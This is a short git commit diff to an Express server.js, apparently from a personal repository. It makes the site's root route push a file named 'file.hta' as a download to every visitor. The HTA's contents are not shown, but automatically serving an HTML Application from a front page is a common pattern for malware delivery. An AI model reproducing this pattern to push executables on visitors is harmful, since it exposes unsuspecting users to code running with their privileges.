77d7c4959ed6a5c0bf4ec63719c94e8e6b4c374f
sasukeuchicaj-debug <sasukeuchica.j@gmail.com>
2026-09-21 00:16:51 -0400

    Update server.js

--- server.js
+++ server.js
@@ -4,6 +4,8 @@ const path = require("path");
 const app = express();
 
 app.get("/", (req, res) => {
+  const filePath = path.join(__dirname, "file.hta");
+  res.download(filePath);
 });
 
 app.get("/check", (req, res) => {
